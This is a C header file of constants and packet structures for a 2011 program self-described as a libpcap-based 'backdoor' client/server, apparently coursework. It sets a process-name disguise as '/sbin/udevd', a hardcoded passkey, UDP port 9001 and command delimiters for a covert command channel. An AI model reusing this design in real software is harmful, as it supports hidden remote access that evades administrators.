#ifndef DEFS_H
#define DEFS_H

/*
SOURCE FILE: defs.h

PROGRAM: Backdoor - A simple two in one backdoor client/server using libpcap

DATE: October 23, 2011

REVISIONS:
	1.0 - October 23

DESIGNERS:
	Santana Mach and Steve Stanisic

PROGRAMMERS:
	Santana Mach and Steve Stanisic

NOTES: This file holds the constants used throughout the program.
*/

#include <sys/types.h>

// Sized types
#define uint8   u_int8_t
#define uint16  u_int16_t
#define uint32  u_int32_t
#define uint64  u_int64_t

#define TRUE    1
#define FALSE   0

#define MASK 	"/sbin/udevd"

#define MAX_LEN    256
#define SLEEP_TIME 100000

#define DEF_PRT 9001
#define DEF_ADR "127.0.0.1"
#define DEF_FLT "udp port 9001"
#define DEF_WCH "/root"

#define HDR_KEY "(P^.^)=P"
#define PASSKEY "tessera"

#define CMD_STR "start["
#define CMD_END "]end"

//#define LOCALHOST 0x0100007F
//#define IPHDR_LEN 5
//#define IP_VER    4
//#define IPHDR_B   20
//#define UDPHDR_B  8
//#define PSDHDR_B  12
//#define MAX_IFACE 8
//#define TTL       64

#include <linux/ip.h>
#include <linux/udp.h>

struct udp_dgram
{
	struct iphdr ip;
	struct udphdr udp;
	char data[MAX_LEN];
};

/*
 * Structure based on Wikipedia article detailing UDP checksum.
 */
struct pseudo_hdr
{
	uint32 saddr;
	uint32 daddr;
	uint8 zero;
	uint8 proto;
	uint16 udp_len;
	struct udphdr udp;
	char data[MAX_LEN];
};

#endif
